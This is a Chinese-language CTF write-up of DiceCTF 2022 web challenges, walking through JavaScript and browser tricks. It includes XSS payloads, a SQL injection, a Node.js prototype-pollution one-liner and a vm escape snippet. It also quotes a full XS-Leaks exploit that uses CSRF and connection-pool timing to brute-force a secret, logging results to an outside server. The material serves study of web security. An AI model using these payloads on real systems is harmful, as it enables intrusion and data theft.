---
title: 我從 DiceCTF 2022 中學到的各種 JS 與前端冷知識
catalog: true
date: 2022-02-08 20:58:50
tags: [Security, Front-end, JavaScript]
categories: [Security]
---

如果你不知道什麼是 CTF，可以參考我之前寫過的：[該如何入門 CTF 中的 Web 題？](https://blog.techbridge.cc/2021/02/20/web-ctf-is-fun/)，裡面有簡單介紹一下什麼是 CTF，以及一些基本的題型。

去年的 DiceCTF 2021 我有認真玩了一下，最後解出 6 題 web 題，心得都在這邊：[DiceCTF 2021 - Summary](https://github.com/aszx87410/ctf-writeups/issues/20)。今年的 DiceCTF 我有看了一下，直接被電爆，難度完全是不同等級。

這次的 Web 題一共有 10 題，1 題水題 365 隊解開，另一題比較簡單一點 75 隊解開，其他 8 題都只有 5 隊以內解開，其中還有一題沒人解開。

身為一個喜歡 web 以及 JS 相關冷知識的人，這是一個很好的學習機會，透過賽後放出的 [writeup](https://hackmd.io/fmdfFQ2iS6yoVpbR3KCiqQ) 來學習各種技巧。底下不會有所有 web 題的筆記，只會有我關注的題目。

<!-- more -->

## misc/undefined(55 solves)

這次在 misc 題型中也有一題跟 JS 相關的，題目敘述如下：

> I was writing some Javascript when everything became undefined...
>   
> Can you create something out of nothing and read the flag at /flag.txt? Tested for Node version 17.

原始碼長這樣：

``` js
#!/usr/local/bin/node
// don't mind the ugly hack to read input
console.log("What do you want to run?");
let inpBuf = Buffer.alloc(2048);
const input = inpBuf.slice(0, require("fs").readSync(0, inpBuf)).toString("utf8");
inpBuf = undefined;

Function.prototype.constructor = undefined;
(async () => {}).constructor.prototype.constructor = undefined;
(function*(){}).constructor.prototype.constructor = undefined;
(async function*(){}).constructor.prototype.constructor = undefined;

for (const key of Object.getOwnPropertyNames(global)) {
    if (["global", "console", "eval"].includes(key)) {
        continue;
    }
    global[key] = undefined;
    delete global[key];
}

delete global.global;
process = undefined;

{
    let AbortController=undefined;let AbortSignal=undefined;
    let AggregateError=undefined;let Array=undefined;
    let ArrayBuffer=undefined;let Atomics=undefined;
    let BigInt=undefined;let BigInt64Array=undefined;
    let BigUint64Array=undefined;let Boolean=undefined;
    let Buffer=undefined;let DOMException=undefined;
    let DataView=undefined;let Date=undefined;
    let Error=undefined;let EvalError=undefined;
    let Event=undefined;let EventTarget=undefined;
    let FinalizationRegistry=undefined;
    let Float32Array=undefined;let Float64Array=undefined;
    let Function=undefined;let Infinity=undefined;let Int16Array=undefined;
    let Int32Array=undefined;let __dirname=undefined;let Int8Array=undefined;
    let Intl=undefined;let JSON=undefined;let Map=undefined;
    let Math=undefined;let MessageChannel=undefined;let MessageEvent=undefined;
    let MessagePort=undefined;let NaN=undefined;let Number=undefined;
    let Object=undefined;let Promise=undefined;let Proxy=undefined;
    let RangeError=undefined;let ReferenceError=undefined;let Reflect=undefined;
    let RegExp=undefined;let Set=undefined;let SharedArrayBuffer=undefined;
    let String=undefined;let Symbol=undefined;let SyntaxError=undefined;
    let TextDecoder=undefined;let TextEncoder=undefined;let TypeError=undefined;
    let URIError=undefined;let URL=undefined;let URLSearchParams=undefined;
    let Uint16Array=undefined;let Uint32Array=undefined;let Uint8Array=undefined;
    let Uint8ClampedArray=undefined;let WeakMap=undefined;let WeakRef=undefined;
    let WeakSet=undefined;let WebAssembly=undefined;let _=undefined;
    let exports=undefined;let _error=undefined;let assert=undefined;
    let async_hooks=undefined;let atob=undefined;let btoa=undefined;
    let buffer=undefined;let child_process=undefined;let clearImmediate=undefined;
    let clearInterval=undefined;let clearTimeout=undefined;let cluster=undefined;
    let constants=undefined;let crypto=undefined;let decodeURI=undefined;
    let decodeURIComponent=undefined;let dgram=undefined;
    let diagnostics_channel=undefined;let dns=undefined;let domain=undefined;
    let encodeURI=undefined;let encodeURIComponent=undefined;
    let arguments=undefined;let escape=undefined;let events=undefined;
    let fs=undefined;let global=undefined;let globalThis=undefined;
    let http=undefined;let http2=undefined;let https=undefined;
    let inspector=undefined;let isFinite=undefined;let isNaN=undefined;
    let module=undefined;let net=undefined;let os=undefined;let parseFloat=undefined;
    let parseInt=undefined;let path=undefined;let perf_hooks=undefined;
    let performance=undefined;let process=undefined;let punycode=undefined;
    let querystring=undefined;let queueMicrotask=undefined;let readline=undefined;
    let repl=undefined;let require=undefined;let setImmediate=undefined;
    let setInterval=undefined;let __filename=undefined;let setTimeout=undefined;
    let stream=undefined;let string_decoder=undefined;let structuredClone=undefined;
    let sys=undefined;let timers=undefined;let tls=undefined;
    let trace_events=undefined;let tty=undefined;let unescape=undefined;
    let url=undefined;let util=undefined;let v8=undefined;let vm=undefined;
    let wasi=undefined;let worker_threads=undefined;let zlib=undefined;
    let __proto__=undefined;let hasOwnProperty=undefined;let isPrototypeOf=undefined;
    let propertyIsEnumerable=undefined;let toLocaleString=undefined;
    let toString=undefined;let valueOf=undefined;

    console.log(eval(input));
}
```

你可以執行任何程式碼，但是在幾乎所有東西都變成 `undefined` 的情況下，你還能做什麼呢？

當初在看這題的時候我也沒有想到該怎麼辦，我試了幾個預設會有的東西像是 `module`、`exports` 之類的，都拿到 `undefined`，想說試試看用 `import`，結果噴了錯誤：`SyntaxError: Cannot use import statement outside a module`。

根據[作者的 writeup](https://hackmd.io/fmdfFQ2iS6yoVpbR3KCiqQ#miscundefined)，這題有兩個解。

第一個解就是雖然 `import "fs"` 行不通，但是 `import('fs')` 可以，我看了一下 [MDN](https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Reference/Statements/import)，上面寫說：「There is also a function-like dynamic import(), which does not require scripts of type="module".」

所以可以這樣解：

``` js
import("fs").then(m=>console.log(m.readFileSync("/flag.txt", "utf8")))
```

另外一個解法則是要知道 Node.js 的一些[細節](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050)，例如說你寫這樣一段程式碼：

``` js
console.log("Trying to reach");
return;
console.log("dead code");
```

因為沒有 function，所以你預期 return 應該會出錯，但執行時你會發現沒有出錯，而且還真的像是有個 function 一樣。這是因為 Node.js 的 module 其實都會被放到 function 裡面，上面的程式碼會像這樣：

``` js
(function (exports, require, module, __filename, __dirname) {
    console.log("Trying to reach");
    return;
    console.log("dead code");
});
```

我們的目標就是拿到 `require` 這個參數，但是因為 `arguments` 也變成 `undefined` 了，所以沒有辦法直接拿到，要間接去拿。這是什麼意思呢，我們可以先執行一個 function，然後再用 `arguments.callee.caller.arguments` 去拿到 parent function 的參數，像是這樣：

``` js

function wrapper(flag) {
  {
    let flag = null
    let arguments = null
    function inner() {
      console.log(arguments.callee === inner) // true
      console.log(arguments.callee.caller === wrapper) // true
      console.log(arguments.callee.caller.arguments[0]) // I am flag
    }
    inner()
  }
}

wrapper('I am flag')
```

這題我自己比較可惜的點有兩個，一個是以前就有學生問過我那個 return 的問題，我當時只有回說外面包了一層 function，但沒有銘記在心中（？），導致完全忘記。

第二個是 `arguments.callee.caller` 這個操作我自己在兩年前就寫過：[覺得 JavaScript function 很有趣的我是不是很奇怪](https://blog.huli.tw/2020/04/18/javascript-function-is-awesome/)。

## web/blazingfast(75 solves)

這題的敘述是：

> I made a blazing fast MoCkInG CaSe converter!

簡單來說就是寫了一個會把奇數位置的字轉成大寫的轉換器，主要程式碼如下：

``` js
let blazingfast = null;

function mock(str) {
	blazingfast.init(str.length);

	if (str.length >= 1000) return 'Too long!';

	for (let c of str.toUpperCase()) {
		if (c.charCodeAt(0) > 128) return 'Nice try.';
		blazingfast.write(c.charCodeAt(0));
	}

	if (blazingfast.mock() == 1) {
		return 'No XSS for you!';
	} else {
		let mocking = '', buf = blazingfast.read();

		while(buf != 0) {
			mocking += String.fromCharCode(buf);
			buf = blazingfast.read();
		}

		return mocking;
	}
}

function demo(str) {
	document.getElementById('result').innerHTML = mock(str);
}

WebAssembly.instantiateStreaming(fetch('/blazingfast.wasm')).then(({ instance }) => {	
	blazingfast = instance.exports;

	document.getElementById('demo-submit').onclick = () => {
		demo(document.getElementById('demo').value);
	}

	let query = new URLSearchParams(window.location.search).get('demo');

	if (query) {
		document.getElementById('demo').value = query;
		demo(query);
	}
})
```

而 blazingfast.c 程式碼如下：

``` c
int length, ptr = 0;
char buf[1000];

void init(int size) {
  length = size;
  ptr = 0;
}

char read() {
  return buf[ptr++];
}

void write(char c) {
  buf[ptr++] = c;
}

int mock() {
  for (int i = 0; i < length; i ++) {
    if (i % 2 == 1 && buf[i] >= 65 && buf[i] <= 90) {
      buf[i] += 32;
    }

    if (buf[i] == '<' || buf[i] == '>' || buf[i] == '&' || buf[i] == '"') {
      return 1;
    }
  }

  ptr = 0;

  return 0;
}
```

只要 buf 裡面的內容有 `<` 跟 `>` 就會直接 return 1，然後 JS 那層就會回傳 `No XSS for you!`，所以無法輕易執行 XSS。

這題的關鍵我有找到，但是當時程式碼沒看清楚導致想錯了，可惜沒解出來。

關鍵就是利用一些奇特的字元創造出長度的差異，例如說 `ß` 這個字元長度是 1，但是轉成大寫之後變成兩個字：

``` js
'ß'.length // 1
'ß'.toUpperCase().length // 2，變成 SS
```

還有其他字元也有這種特性，可以自己 fuzzing 一下，有些字元拿來繞過長度限制很好用，像是這篇：[Exploiting XSS with 20 characters limitation](https://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html) 就利用這招縮短長度，網址也可以用同樣的手法，可參考：[domain-obfuscator](https://github.com/splitline/domain-obfuscator) 或是 [Unicode Mapping on Domain names](https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names)

假設我有個字串是 `ßßßßßßßß<b>1</b>`，長度是 16，所以在初始化的時候 length 會是 16，但是當跑到迴圈的時候因為轉成大寫，會是 `8*2+8` = 24 個字，所以 24 個字會全部被寫進去 buf 裡面。

在 `mock` 函式裡面，只會檢查 length 內的東西，所以最後 8 個字不會被檢查到，可以偷渡 `<>` 這些字元進去，像這樣：

![](/img/dicectf2022/p1.png)

但因為所有字元都會變成大寫，所以要找一個變成大寫之後還是可以用的 XSS payload，這時候可以用 encode 過的字串，像這樣：

```
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)" />
```

如此一來就搞定了，或是也可以參考更複雜的做法：https://smitop.com/p/dctf22-blazingfast/

## web/no-cookies(5 solves)

這一題很有趣，敘述是：

> I found a more secure way to authenticate users. No cookies, no problems!

簡單來說就是有個網站，無論做什麼操作都會先問你帳號密碼，打 API 也會直接把帳號密碼帶上去，如此一來就不需要 cookie 了。

這題前端的程式碼如下：

``` js
(() => {
  const validate = (text) => {
    return /^[^$']+$/.test(text ?? '');
  }

  const promptValid = (text) => {
    let result = prompt(text) ?? '';
    return validate(result) ? result : promptValid(text);
  }

  const username = promptValid('Username:');
  const password = promptValid('Password:');

  const params = new URLSearchParams(window.location.search);

  (async () => {
    const { note, mode, views } = await (await fetch('/view', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        username,
        password,
        id: params.get('id')
      })
    })).json();

    if (!note) {
      alert('Invalid username, password, or note id');
      window.location = '/';
      return;
    }

    let text = note;
    if (mode === 'markdown') {
      text = text.replace(/\[([^\]]+)\]\(([^\)]+)\)/g, (match, p1, p2) => {
        return `<a href="${p2}">${p1}</a>`;
      });
      text = text.replace(/#\s*([^\n]+)/g, (match, p1) => {
        return `<h1>${p1}</h1>`;
      });
      text = text.replace(/\*\*([^\n]+)\*\*/g, (match, p1) => {
        return `<strong>${p1}</strong>`;
      });
      text = text.replace(/\*([^\n]+)\*/g, (match, p1) => {
        return `<em>${p1}</em>`;
      });
    }

    document.querySelector('.note').innerHTML = text;
    document.querySelector('.views').innerText = views;
  })();
})();
```

parse Makrdown 那一段就一臉可以 XSS 的樣子：

``` js
text = text.replace(/\[([^\]]+)\]\(([^\)]+)\)/g, (match, p1, p2) => {
        return `<a href="${p2}">${p1}</a>`;
      });
```

事後作者說他本來沒有想要在這邊留洞，這個洞是 GitHub copilot 寫出來的XD 但他覺得很有趣就留下來了。

這個 XSS 的洞並不難找

``` js
var text = '[abc](123" onfocus=alert`1` autofocus=")'
text = text.replace(/\[([^\]]+)\]\(([^\)]+)\)/g, (match, p1, p2) => {
  return `<a href="${p2}">${p1}</a>`;
});
console.log(text)
// <a href="123" onfocus=alert`1` autofocus="">abc</a>
```

但問題是有了 XSS 之後，該怎麼把密碼偷出來（密碼就是這題的 flag）？

我當時怎麼看都不覺得可以偷到密碼，賽後看 writeup 才知道一個神奇的屬性：[RegExp.input](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/input)，這個屬性可以拿到 RegExp 最後一次的 input，例如說這樣：

``` js
/a/.test('secret password')
console.log(RegExp.input) // secret password
```

而 password 就是最後一次丟去 `/^[^$']+$/.test()` 的輸入，所以就可以藉此拿到 password，這真的是 mind-blowing。

但這邊還有個細節，那就是如果你用了 markdown XSS，最後配對的 regexp 就不是 password 了，所以就拿不到。這時候你必須找出 server 的 SQL injection，程式碼如下：

``` js
const db = {
  prepare: (query, params) => {
    if (params)
      for (const [key, value] of Object.entries(params)) {
        const clean = value.replace(/['$]/g, '');
        query = query.replaceAll(`:${key}`, `'${clean}'`);
      }
    return query;
  },
  get: (query, params) => {
    const prepared = db.prepare(query, params);
    try {
      return database.prepare(prepared).get();
    } catch {}
  },
  run: (query, params) => {
    const prepared = db.prepare(query, params);
    try {
      return database.prepare(prepared).run();
    } catch {}
  },
};

const id = crypto.randomBytes(16).toString('hex');
db.run('INSERT INTO notes VALUES (:id, :username, :note, :mode, 0)', {
  id,
  username,
  note: note.replace(/[<>]/g, ''),
  mode,
});
```

會把所有單引號跟 $ 拿掉，然後去 replace 所有的 `:param`，這時候可以利用這個特性來注入，例如說這樣 (from DrBrix)：

```
"username": "a :note",
"password": "pass"
"note": ", :mode, 0, 0) -- ",
"mode": "actual note and xss"
```

我們來看一下最後會變怎樣：

``` sql
// 一開始是
INSERT INTO notes VALUES (:id, :username, :note, :mode, 0)

// 接著假設 id 是 123，就會變成
INSERT INTO notes VALUES ('123' :username, :note, :mode, 0)

// 再來 replace username，變成
INSERT INTO notes VALUES ('123', 'a :note', :note, :mode, 0)

// 再來是 note，要注意的是兩個 note 都會被 replace
INSERT INTO notes VALUES ('123', 'a ', :mode, 0, 0) -- '', ', :mode, 0, 0) -- ', :mode, 0)

// 最後是 mode，這時候我們已經可以控制 note 內容的值了，沒有任何限制
INSERT INTO notes VALUES ('123', 'a ', 'payload', 0, 0) -- '', ', 'payload', 0, 0) -- ', :mode, 0)
```

利用這個洞，就可以不依靠 markdown 來做 XSS，再利用 `RegExp.input` 這個神奇屬性拿到 password。

### 預期外解法

這題的預期外解法也是超帥，不需要 `RegExp.input` 了，利用的特性是底下這段程式碼：

``` js
document.querySelector('.note').innerHTML = text;
document.querySelector('.views').innerText = views;
```

這段程式碼你可能會預期插入 HTML 之後，會先繼續往下執行，然後才執行 HTML 裡面的內容，例如說：

``` html
<div id=x></div>
<div id=y>hello</div>
<script>
    x.innerHTML = '<img src=x onerror=alert(window.y.innerText)>'
    y.innerText = 'updated'
</script>
```

顯示出來的 alert 會是 `updated`，img 的事件確實是後來才執行，但如果是這樣寫的話就不一樣了：

``` html
<div id=x></div>
<div id=y>hello</div>
<script>
    x.innerHTML = '<svg><svg onload=alert(window.y.innerText)>'
    y.innerText = 'updated'
</script>
```

這樣寫的話，`onload` 裡的東西會在 `y.innerText = 'updated'` 之前執行，所以 alert 的內容會是 `hello`，這個 payload 其實也有記在 [tinyXSS](https://github.com/terjanq/Tiny-XSS-Payloads) 裡面：

``` html
<!-- In chrome, also works inside innerHTML, even on elements not yet inserted into DOM -->
<svg><svg/onload=eval(name)>
```

那知道這個之後可以幹嘛呢？

我們先整理一下載入筆記的程式碼，簡化後長這樣：

``` js
(async () => {
  const { note, mode, views } = await (await fetch('/view', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      username,
      password,
      id: params.get('id')
    })
  })).json();

  document.querySelector('.note').innerHTML = text;
  // 在底下這行執行之前，會先執行我們的 XSS payload
  document.querySelector('.views').innerText = views;
})();
```

現在如果我們可以在最後一行之前執行程式碼的話，就可以做一些有趣的事情。

我們可以先把 `document.querySelector` 蓋掉，再把 `JSON.stringify` 蓋掉，像是這樣：

``` js
document.querySelector = function() {
  JSON.stringify = function(data) {
    
  }
}
```

蓋掉之後可以幹嘛呢？蓋掉之後我們就可以用 `arguments.callee.caller`，存取到最外層那個匿名的 async 函式，然後再呼叫一次！再呼叫一次之後，就會再發送一次 request，然後透過 `JSON.stringify` 把 password 傳進去，這時我們就可以攔截到：

``` js
document.querySelector = function() {
  JSON.stringify = function(data) {
    console.log(data.password) // flag
  };
  arguments.callee.caller()
}
```

這個非預期解來自於 [@dr_brix](https://twitter.com/dr_brix)，真的超級帥，從沒想過可以這樣做。

## web/vm-calc(2 solves)

話說做個計算功能是 CTF 中常見的題型，以這題來說乍看之下會以為是 VM escape，核心程式碼如下：

``` js
const { NodeVM } = require('vm2');
const vm = new NodeVM({
    eval: false,
    wasm: false,
    wrapper: 'none',
    strict: true
});

app.post("/", (req, res) => {
    const { calc } = req.body;

    if(!calc) {
        return res.render("index");
    }

    let result;
    try {
        result = vm.run(`return ${calc}`);
    }
    catch(err) {
        console.log(err);
        return res.render("index", { result: "There was an error running your calculation!"});
    }

    if(typeof result !== "number") {
        return res.render("index", { result: "Nice try..."});
    }

    res.render("index", { result });
});
```

而可以拿到 flag 的程式碼是這一段：

``` js
app.post("/admin", async (req, res) => {
    let { user, pass } = req.body;
    if(!user || !pass || typeof user !== "string" || typeof pass !== "string") {
        return res.render("admin", { error: "Missing username or password!" });
    }

    let hash = sha256(pass);
    if(users.filter(u => u.user === user && u.pass === hash)[0] !== undefined) {
        res.render("admin", { flag: await fsp.readFile("flag.txt") });
    }
    else {
        res.render("admin", { error: "Incorrect username or password!" });
    }
});
```

有關於 VM escape，我所知道的都是根據這個檔案：https://gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af

裡面有一些方式很有趣，例如說這一段：

``` js
////////
// Also, the vm code could throw an exception, with proxies on it.

const code5 = `throw new Proxy({}, {
  get: function(me, key) {
	 const cc = arguments.callee.caller;
	 if (cc != null) {
		(cc.constructor.constructor('console.log(sauce)'))();
	 }
	 return me[key];
  }
})`;


try {
  vm.runInContext(code5, vm.createContext(Object.create(null)));
}
catch(e) {
  // The following prints out 'laser' twice, (as side-effects of e
  // being converted to a string) followed by {}, which is the effect
  // of the console.log actually *on* this line printing out the
  // stringified value of the exception, which is in this case a
  // (proxy-wrapped) empty object.
  console.log(e);
}
```

丟一個 proxy 出去當 exception，然後當有人對這個 exception 執行 toString 時，就會觸發到，就可以透過 `arguments.callee.caller` 拿到外界的 function。

不過這題並不是要你找 vm2 0 day，而是要利用一個 Node.js 1 day，利用 prototype pollution 來繞過這一段：

``` js
if(users.filter(u => u.user === user && u.pass === hash)[0] !== undefined) {
    res.render("admin", { flag: await fsp.readFile("flag.txt") });
}
```

這個繞過我覺得也是很猛，照理來說 `users.filter` 因為沒條件符合，所以會返回空陣列，這時候通常都會檢查長度才對，這邊卻檢查第一個元素是不是 undefined。

這是因為如果有一個 prototype pollution 的漏洞，我們可以污染陣列的第一個屬性，那 `[][0]` 就會有東西，就可以讓 if 成立。

而這個漏洞編號為 [CVE-2022-21824](https://nodejs.org/en/blog/vulnerability/jan-2022-security-releases/#prototype-pollution-via-console-table-properties-low-cve-2022-21824)，利用方式是：

``` js
console.table([{x:1}], ["__proto__"]);
```

這個 API 第一個參數是資料，第二個參數是要顯示的欄位，像這樣：

![](/img/dicectf2022/p2.png)

修復的 commit 是這一個：https://github.com/nodejs/node/commit/3454e797137b1706b11ff2f6f7fb60263b39396b

從中可以得知是 `map` 這個 object 的問題，我們接著來看一下 `console.table` 的程式碼的重點部分：[lib/internal/console/constructor.js](https://github.com/nodejs/node/blob/3454e797137b1706b11ff2f6f7fb60263b39396b/lib/internal/console/constructor.js#L482)

``` js
// tabularData 是第一個參數 [{x:1}]
// properties 是第二個參數 ["__proto__"]
const map = ObjectCreate(null);
let hasPrimitives = false;
const valuesKeyArray = [];
const indexKeyArray = ObjectKeys(tabularData);

for (; i < indexKeyArray.length; i++) {
  const item = tabularData[indexKeyArray[i]];
  const primitive = item === null ||
      (typeof item !== 'function' && typeof item !== 'object');
  if (properties === undefined && primitive) {
    hasPrimitives = true;
    valuesKeyArray[i] = _inspect(item);
  } else {
    const keys = properties || ObjectKeys(item);
	
    // for of 的時候 key 會是 __proto__ 
    for (const key of keys) {
      if (map[key] === undefined)
        map[key] = [];
      
      // !ObjectPrototypeHasOwnProperty(item, key) 會成立
      if ((primitive && properties) ||
           !ObjectPrototypeHasOwnProperty(item, key))

        // 因此 map[__proto__][0] 會是空字串
        map[key][i] = '';
      else
        map[key][i] = _inspect(item[key]);
    }
  }
}
```

所以透過這個方式，可以污染 `Object.prototype[0]`，讓它變成空字串。

看來應該要 follow 一下 Node.js security updates，感覺滿多有用的資訊。

## web/noteKeeper(2 solves)

這題當時沒仔細看，先放著未來有機會再研究：https://brycec.me/posts/dicectf_2022_writeups#notekeeper

## web/dicevault(2 solves)

這題也沒仔細看，只知道是致敬另外一題：http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html

作者解答：https://hackmd.io/fmdfFQ2iS6yoVpbR3KCiqQ#webdicevault

## web/carrot(1 solves)

這題也很有趣，是個很簡單的 service，可以新增 note 跟搜尋，畫面如下：

![](/img/dicectf2022/p3.png)

搜尋的時候會搜尋內容，有的話就會顯示，後端程式碼如下：

``` py
@app.route('/tasks')
def tasks():
    if 'username' not in session:
        return redirect('/')

    tasks = db.get(session['username'])['tasks']

    if 'search' in request.args:
        search = request.args['search']
        tasks = list(filter(lambda task: search in task['content'], tasks))

    tasks = list(sorted(tasks, key=lambda task: -task['priority']))

    return render_template('tasks.html', tasks=tasks)
```

flag 藏在 admin note 裡面，在啟動時會自動建立：

``` py
if not has('admin'):
	password = config.ADMIN_PASSWORD
	
	put('admin', {
		'tasks': [{
			'title': 'flag',
			'content': os.getenv('FLAG', default='dice{flag}'),
			'priority': 1,
			'id': 0
		}],
		'password': bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode('utf-8')
	})
```

從 admin bot 的行為跟其他觀察看起來，就是個 XS-Leaks 的題目，只要能觀測到 search 的結果有沒有 flag 就行了，但難就難在想不出怎麼觀測。

這題官方沒有釋出而且似乎不會釋出解答（既然不釋出，可能是 Chrome 0 day 或是某個還沒修的 bug？），但賽後討論有人給了 XS-Leaks 的 exploit: https://gist.github.com/kunte0/47c2b53535605d842f984e77d6c63eed

完整程式碼：

``` html
<h1>DiceCTF 2022 web/carrot</h1>

<p>Step 1: CSRF the admin user, to set a super long title for the flag note (LAX + POST form only possible for 2 minutes after cookies is created)</p>
<button onclick="csrf()">do csrf</button>
<p>Step 2: XS-Search with <a href="https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/">connection-pool timing leak</a>, we have to use window.open (LAX cookie)</p>

<button onclick="popunder()">open popup</button>
<button onclick="exhaust_sockets()">open 255 connections</button>
<button onclick="oracle('dice{abc')">test search "abc" (slow)</button>
<button onclick="oracle('dice{xxx')">test search "xxx" (fast)</button>
<br>
<br>
<h2 id=output></h2>
<br>
<form id=x action="" method="POST" style="display:none;">
	<input type="text" name="title" placeholder="title">
	<br><br>
	<input type="number" name="priority" placeholder="priority" value=9999>
	<br><br>
	<textarea name="content" placeholder="content" rows="5" cols="20"></textarea>
	<br><br>
	<input type="submit" value="submit">
</form>

<script>

// this is send is used as logging
LOG = 'Starting'
// 255 in normal chrome, 99 in headless
SOCKETLIMIT = 255;
// default
TIMELIMIT = 800;
INSTANCE = ''
MYSERVER = `example.com`

const sleep = (ms) => {
    return new Promise(resolve => {
        setTimeout(resolve, ms);
    });
}

const time_fetch = async() => {
    let test_server_url = `https://${MYSERVER}/?${LOG}`;
    let start = window.performance.now();
    try {
        await fetch(test_server_url, {
            mode: 'no-cors'
        });
    } catch (e) {
        console.log(e);
    }
    let end = window.performance.now();
    return end - start;
}

const fetch_sleep_long = (i) => {
    // 40s sleep
    return fetch(`https://${i}.${MYSERVER}/40sleep`, {
        mode: 'no-cors'
    });
}

const fetch_sleep_short = (i) => {
    // 0.25s sleep
    return fetch(`https://${i}.${MYSERVER}/ssleep`, {
        mode: 'no-cors'
    });
}

const block_socket = async (i) => {
    fetch_sleep_long(i);
    // needed?
    await sleep(0);
}

const exhaust_sockets = async() => {
    let i = 0
    for (; i < SOCKETLIMIT; i++) {
        block_socket(i);
    }
    console.log(`Used ${i} connections`);
}

const timeit = async (url, popup) => {
    return new Promise(async (r) => {

        popup.location = url;
        // needed?
        await sleep(50)

        let val = await time_fetch()
        r(val)
    });
}

// const alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-}!"#$%&\'()*+,-./:;<=>?@[\\]^`|~{'.split('');
const alphabet = 'abcdefghijklmnopqrstuvwxyz}_'.split('');
// const alphabet = 'abcdef}'.split('');

const oracle = async (search) => {
    let url = `https://carrot-${INSTANCE}.mc.ax/tasks?search=${search}`
    let t = await timeit(url, WINBG)

    LOG = `${search}:${t}`
    console.log(`${search}:${t}`)

    return t > TIMELIMIT 
}

const brute = async (flag) => {
    for (const char of alphabet) {
        if (await oracle(flag + char)) {
            return char;
        }
    }
    return false;
}

const calibrate = async () => {
    return new Promise(async (r) => {
        // slow
        let url1 = `https://carrot-${INSTANCE}.mc.ax/tasks?search=dice{`
        let t1 = await timeit(url1, WINBG)
        console.log(`slow:${t1}`)
        // fast
        let url2 = `https://carrot-${INSTANCE}.mc.ax/tasks?search=XXXXXXXXXX`
        let t2 = await timeit(url2, WINBG)
        console.log(`fast:${t2}`)
        return r((t1 + t2) / 2)
    });

}

const exploit = async(flag = '') => {
    console.log('Starting')
    // dont go to fast plz :) 
    console.log(`waiting 3s`)
    await sleep(3000)
    // exaust sockets
    await exhaust_sockets()
    await sleep(2000)
    LOG = `Calibrating`
    TIMELIMIT = await calibrate()
    LOG = `TIMELIMIT:${TIMELIMIT}`
    console.log(`timelimit:${TIMELIMIT}`)
    await sleep(2000)
    let last;
    while (true) {
        last = await brute(flag);
        if (last === false) {
            return flag;
        } 
        else {
            flag += last;
            output.innerText = flag;
            if(last === '}'){
                return flag
            }
        }
    }
}

const popunder = () => {
    if (window.opener) {
            WINBG = window.opener
    } 
    else {
        WINBG = window.open(location.href, target="_blank")
        location = `about:blank`
    }
}

const csrf = async () => {
    x.action = `https://carrot-${INSTANCE}.mc.ax/edit/0`
    x.title.value = "A".repeat(1000000)
    x.submit()
}

window.onload = () => {
    let p = new URL(location).searchParams;
    if(!p.has('i')){
        console.log(`no INSTANCE`)
        return
    }
    INSTANCE = p.get('i')
    // step 1 
    if(p.has('csrf')){
        csrf()
        return
    }
    // step 2
    if (p.has('exploit')) {
        // window open is ok in headless :)
        popunder()
        
        exploit('dice{')
    }
}
</script>
```

簡單來說可以先用 CSRF 去改 admin note 的 title，改成一個超級長的字串，因為 jinja2 render 會變慢，所以 response time 就會增加。

再來就是 timing attack 了，上面的 exploit 用的是 [connection pool](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)，先把瀏覽器的 connection pool 塞到只剩下一個，這時候就剩下一個 connection 可以用了。

這時候我們用新的 window 去造訪 search 的 URL（稱作 reqSearch 好了），與此同時再發一個 request 到我們自己的 server（我們叫做 reqMeasure），因為只有一個 connection 可以用，所以 reqMeasure 從發出 request 到收到 response 的時間，就是 `reqSearch 花的時間 + reqMeasure 花的時間`，假設 reqMeasure 花的時間都差不多，那我們很容易可以測量出 reqSearch 花的時間。

可以測量時間之後，就可以慢慢暴力破解出 flag 的內容。

## web/shadow(0 solves)

這題是純前端的題目，我們直接來看程式碼：

``` html
<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <title>shadow</title>
  </head>
  <body>
    <h3 id="title">store your secrets here:</h3>
    <div id="vault"></div>
    <div id="xss"></div>
    <script>
      // the admin has the flag set in localStorage["secret"]
      let secret = localStorage.getItem("secret") ?? "dice{not_real_flag}"
      let shadow = window.vault.attachShadow({ mode: "closed" });
      let div = document.createElement("div");
      div.innerHTML = `
          <p>steal me :)</p>
          <!-- secret: ${secret} -->
      `;
      let params = new URL(document.location).searchParams;
      let x = params.get("x");
      let y = params.get("y");
      div.style = y;
      shadow.appendChild(div);
      secret = null;
      localStorage.removeItem("secret");
      shadow = null;
      div = null;
      
      // free XSS
      window.xss.innerHTML = x;
    </script>
  

</body></html>
```

建立了一個 closed 的 shadow DOM，然後要你想辦法可以存取到裡面的內容。根據 [MDN](https://developer.mozilla.org/en-US/docs/Web/API/Element/attachShadow#parameters) 的說法，closed 的意思是：

> closed: Denies access to the node(s) of a closed shadow root from JavaScript outside it:

所以用 JavaScript 沒辦法直接存取到程式碼，因為怎麼 query 都是 null。

因此這題的關鍵是特地留的一個 style injection：`div.style = y;`，你可以新增一些 CSS。

在做這題的時候我想說會不會是用 [Houdini](https://developer.mozilla.org/en-US/docs/Web/Guide/Houdini) 然後自己實作一些 CSS 的自訂屬性或是排版規則，就可以拿到 DOM，但因為 CSP 跟執行順序的關係，應該是沒有辦法。

後來因為這題太久都沒人解開，主辦單位釋出了一個提示：「Hint 1: non-standard css properties might help you」

看到這個之後我就去 Google：`non-standard css properties`，然後有找到這個：[Non-standard and Obsolete CSS Properties](https://gist.github.com/ryboe/bb95223148e486acbe7a)，並且實際去試了裡面幾個屬性，但都沒什麼幫助。

此時我突然好奇起 Chrome 到底支援哪些 CSS 屬性，於是就直接去找原始碼來看，找到這個：https://chromium.googlesource.com/chromium/blink/+/refs/heads/main/Source/core/css/CSSProperties.in

